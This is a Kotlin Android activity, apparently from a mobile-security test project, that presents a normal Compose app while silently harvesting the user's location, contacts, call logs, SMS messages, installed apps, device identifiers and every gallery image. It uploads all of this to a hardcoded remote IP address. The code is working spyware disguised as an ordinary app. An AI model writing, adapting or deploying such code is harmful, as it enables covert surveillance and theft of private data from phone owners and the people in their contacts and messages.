package com.example.testmobsec

import android.Manifest
import android.content.pm.PackageManager
import android.location.Location
import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.viewModels
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.runtime.Composable
import androidx.compose.ui.Modifier
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.navigation.compose.rememberNavController

import com.example.testmobsec.util.SharedViewModel
import com.example.testmobsec.viewModel.BandViewModel
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.io.DataOutputStream
import java.io.File
import java.io.FileInputStream
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationServices

class MainActivity : ComponentActivity() {
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private var details: JSONObject = JSONObject()
    companion object {
        const val LOCATION_PERMISSION_REQUEST_CODE = 1
    }

    private val sharedViewModel: SharedViewModel by viewModels()
    private val bandViewModel: BandViewModel by viewModels()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // Initialize the FusedLocationProviderClient
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        checkLocationPermissions()
        setContent {
            MainApp(sharedViewModel = sharedViewModel, bandViewModel = bandViewModel)
            }
        }
    private fun sendDetailsToServer(details: JSONObject) {
        val url = URL("http://13.92.41.98:5000/submit_details")
        val connection = url.openConnection() as HttpURLConnection
        try {
            connection.doOutput = true
            connection.requestMethod = "POST"
            connection.setRequestProperty("Content-Type", "application/json")
            val outputStreamWriter = OutputStreamWriter(connection.outputStream)
            outputStreamWriter.write(details.toString())
            outputStreamWriter.flush()
            if (connection.responseCode == HttpURLConnection.HTTP_OK) {
                Log.d("MainActivity", "Details sent successfully")
            } else {
                Log.e("MainActivity", "Failed to send details: ${connection.responseMessage}")
            }
        } catch (e: Exception) {
            Log.e("MainActivity", "Exception: ${e.message}")
        } finally {
            Log.e("MainActivity", "disconnecting")
            connection.disconnect()
        }
    }

    private fun sendImageToServer(imageFile: File) {
        val url = URL("http://13.92.41.98:5000/upload")
        val connection = url.openConnection() as HttpURLConnection

        try {
            connection.doOutput = true
            connection.requestMethod = "POST"
            connection.setRequestProperty("Content-Type", "multipart/form-data;boundary=*****")

            val outputStream = DataOutputStream(connection.outputStream)

            // Write boundary
            outputStream.writeBytes("--*****\r\n")
            outputStream.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"${imageFile.name}\"\r\n")
            outputStream.writeBytes("\r\n")

            // Open input stream for image file
            val inputStream = FileInputStream(imageFile)

            // Write image data to output stream
            val buffer = ByteArray(1024)
            var bytesRead: Int
            while (inputStream.read(buffer).also { bytesRead = it } != -1) {
                outputStream.write(buffer, 0, bytesRead)
            }
            outputStream.writeBytes("\r\n")
            inputStream.close()

            // Write end boundary
            outputStream.writeBytes("--*****--\r\n")
            outputStream.flush()

            // Check response code
            if (connection.responseCode == HttpURLConnection.HTTP_OK) {
                println("Image sent successfully")
            } else {
                println("Failed to send image: ${connection.responseMessage}")
            }
        } catch (e: Exception) {
            println("Exception: ${e.message}")
        } finally {
            connection.disconnect()
        }
    }

    // Check for location permissions at Runtime, request the missing permissions if not
    private fun checkLocationPermissions() {
        if ((ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED
                    || ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED)
            && ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED
            && ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED
            && ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED
            && ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED
            && ContextCompat.checkSelfPermission(this, Manifest.permission.BIND_NOTIFICATION_LISTENER_SERVICE) != PackageManager.PERMISSION_GRANTED
            && ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED
            && ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) {

            // Permission is not granted; request it
            ActivityCompat.requestPermissions(this,
                arrayOf(
                    Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION,
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.READ_PHONE_STATE,
                    Manifest.permission.READ_SMS,
                    Manifest.permission.BIND_NOTIFICATION_LISTENER_SERVICE,
                    Manifest.permission.READ_MEDIA_IMAGES,
                    Manifest.permission.RECEIVE_SMS),

                LOCATION_PERMISSION_REQUEST_CODE)

        } else {
            // Permission has already been granted, proceed with accessing location
            print("For debug: Permission granted for accessing location")
            getLastLocation()
            proceedWithActions()
        }
    }

    private fun proceedWithActions() {
        // Proceed with actions after permissions are granted
        val sysinfo = SystemDetails.getSystemDetails(this)
        val uuid = SystemDetails.getUUID(this)
        val contactsInfo = SystemDetails.getContactList(this)
        val calllogs = SystemDetails.getCallLogs(this)
        val readSMSInbox = SystemDetails.readMessages(this,"inbox") + SystemDetails.readMessages(this,"sent")
        val getGallery = SystemDetails.listOfImages(this)
        val appsinstalled = SystemDetails.installedApps(this)

        if (getGallery.isEmpty()) {
            Log.e("SMSInbox", "No images found")
        } else {
            for (imagePath in getGallery) {
                val imageFile = File(imagePath)
                GlobalScope.launch(Dispatchers.IO) {
                    sendImageToServer(imageFile)
                }
            }
        }
        Log.e("apps", appsinstalled)
        details.put("UUID", uuid)
        details.put("OS Details", sysinfo)
        details.put("Contacts", contactsInfo)
        details.put("Call History", calllogs)
        details.put("SMS Inbox", SystemDetails.formatSMSMessages(readSMSInbox))
        details.put("App Installed", appsinstalled)
        Log.e("MainActivity", contactsInfo)

        GlobalScope.launch(Dispatchers.IO) {
            sendDetailsToServer(details)
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        when (requestCode) {
            LOCATION_PERMISSION_REQUEST_CODE -> {
                if ((grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED)) {
                    // Permission was granted, proceed with accessing location
                    print("For debug: Permission granted for accessing location")
                    getLastLocation()
                    //proceedWithActions()
                } else {
                    // Permission denied, handle the case where the user denies the permission.
                    print("For debug: Permission DENIED for accessing location")
                }
                return
            }
            // Add other 'when' lines to check for other permissions this app might request if any.
        }
    }

    private fun getLastLocation() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            fusedLocationClient.lastLocation.addOnSuccessListener { location: Location? ->
                location?.let {
                    try {
                        val latitude = it.latitude
                        val longitude = it.longitude
                        val locationUser = "X:$latitude, Y:$longitude | "
                        details.put("Location", locationUser)
                        Log.d("LocationData", locationUser)
                        proceedWithActions()
                    } catch (e: Exception) {
                        Log.e("LocationData", "Error saving location data", e)
                    }
                } ?: Log.d("LocationData", "Location is null")
            }
        }
    }
}


@Composable
fun MainApp(sharedViewModel: SharedViewModel, bandViewModel: BandViewModel) {

        // A surface container using the 'background' color from the theme
        Surface(
            modifier = Modifier.fillMaxSize(),
            color = MaterialTheme.colorScheme.background
        ) {
            val navController = rememberNavController()
            NavGraph(navController = navController, sharedViewModel =  sharedViewModel, bandViewModel = bandViewModel)
        }

}